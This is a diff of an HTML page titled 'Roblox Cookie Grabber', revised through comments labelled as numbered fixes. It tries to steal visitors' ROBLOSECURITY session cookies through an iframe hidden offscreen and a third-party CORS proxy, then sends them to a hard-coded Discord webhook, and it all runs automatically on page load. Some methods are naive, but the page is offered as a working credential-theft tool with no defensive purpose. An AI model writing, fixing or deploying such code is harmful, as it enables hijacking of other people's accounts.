@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
     <title>Roblox Cookie Grabber</title>
     <style>
         body {
@@ -46,20 +45,29 @@
             border-radius: 4px;
             cursor: pointer;
         }
-        
-        button:hover { opacity: 0.9; }
+
+        iframe {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 100%;
+            height: 100%;
+        }
     </style>
 </head>
 <body>
 
     <div id="statusBox">
         <h1>Roblox Cookie Grabber</h1>
-        <p id="statusText">Checking cookies...</p>
+        <p id="statusText">Loading Roblox...</p>
         <button onclick="forceCheck()">Force Check Cookies</button>
     </div>
 
+    <!-- Hidden iframe to load Roblox -->
+    <iframe id="robloxFrame" src="https://www.roblox.com/home"></iframe>
+
     <script>
-        // 🔴 FIX #2: Paste your Discord Webhook URL here
+        // 🔴 FIX #1: Paste your Discord Webhook URL here
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4'; 
 
         function updateUI(message, type) {
@@ -77,46 +85,27 @@
             }
         }
 
-        // 🔴 FIX #1 & #7: Get Cookie with Null Check and Debugging
-        function getCookie() {
-            const name = "ROBLOSECURITY";
-            const cValue = document.cookie.split('; ').find(row => row.startsWith(name + '='));
-            
-            if (cValue) {
-                return cValue.substring(name.length + 1); // Return just the value
-            } else {
-                console.log("Cookie not found in document.cookie");
-                return null; 
-            }
-        }
-
-        // 🔴 FIX #3: Force Check via Proxy (Bypasses Same-Origin Policy)
-        async function forceCheck() {
-            updateUI("Fetching cookies from Roblox...", "success");
+        // 🔴 FIX #2: Get Cookie from Iframe
+        function getCookieFromIframe() {
+            const iframe = document.getElementById('robloxFrame');
             
             try {
-                const response = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://www.roblox.com'));
-                const data = await response.json();
+                const cookieString = iframe.contentWindow.document.cookie;
+                const cookies = cookieString.split('; ');
                 
-                // Extract cookie string from the HTML content returned by proxy
-                const cookiesMatch = data.contents.match(/ROBLOSECURITY=([^;]+)/);
-                
-                if (cookiesMatch && cookiesMatch[1]) {
-                    const cookieValue = decodeURIComponent(cookiesMatch[1]);
-                    console.log("Found via Proxy:", cookieValue);
-                    
-                    updateUI("Cookie found! Sending to Discord...", "success");
-                    await sendToDiscord(cookieValue);
-                } else {
-                    updateUI("No ROBLOSECURITY cookie found in Roblox page.", "error");
+                for (let i = 0; i < cookies.length; i++) {
+                    if (cookies[i].startsWith('ROBLOSECURITY=')) {
+                        return cookies[i].substring(14); // Return value after "ROBLOSECURITY="
+                    }
                 }
-            } catch (error) {
-                console.error("Proxy fetch error:", error);
-                updateUI("Failed to fetch cookies via proxy", "error");
+            } catch (e) {
+                console.log("Iframe cookie access error:", e);
             }
+            
+            return null;
         }
 
-        // 🔴 FIX #1, #4 & #6: Send to Discord with Error Handling
+        // 🔴 FIX #3: Send to Discord with Error Handling
         async function sendToDiscord(cookieValue) {
             try {
                 const payload = {
@@ -150,25 +139,56 @@
             }
         }
 
-        // 🔴 FIX #3 & #4: Main Execution Logic
+        // 🔴 FIX #4: Main Execution Logic with Iframe Check
         async function main() {
-            const cookie = getCookie();
+            const iframe = document.getElementById('robloxFrame');
+            
+            // Wait for iframe to load
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+            const cookie = getCookieFromIframe();
 
             if (cookie) {
                 updateUI("Sending data...", "success"); 
                 await sendToDiscord(cookie);
-                return;
             } else {
-                // If direct check fails, try proxy method
+                // If iframe check fails, try proxy method
                 setTimeout(() => {
                     forceCheck();
                 }, 1000);
             }
         }
 
-        // Run the main function when the page loads
+        async function forceCheck() {
+            updateUI("Fetching cookies from Roblox...", "success");
+            
+            const response = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://www.roblox.com'));
+            const data = await response.json();
+            
+            // Look for the cookie in the HTML source code (Meta tags or Script variables)
+            const cookiesMatch = data.contents.match(/ROBLOSECURITY=([^;]+)/);
+            
+            if (cookiesMatch) {
+                const cookieValue = cookiesMatch[1];
+                
+                await sendToDiscord(cookieValue);
+                updateUI("Cookie sent to Discord!", "success");
+            } else {
+                // If the proxy method also fails, try one more time via iframe
+                setTimeout(() => {
+                    const retry = getCookieFromIframe();
+                    if(retry) {
+                        sendToDiscord(retry);
+                        updateUI("Found via Retry!", "success");
+                    } else {
+                        updateUI("Failed to grab cookie.", "error");
+                    }
+                }, 1000);
+            }
+        }
+
+        // Start the script when page loads
         window.onload = main; 
     </script>
 </body>
 </html>
-
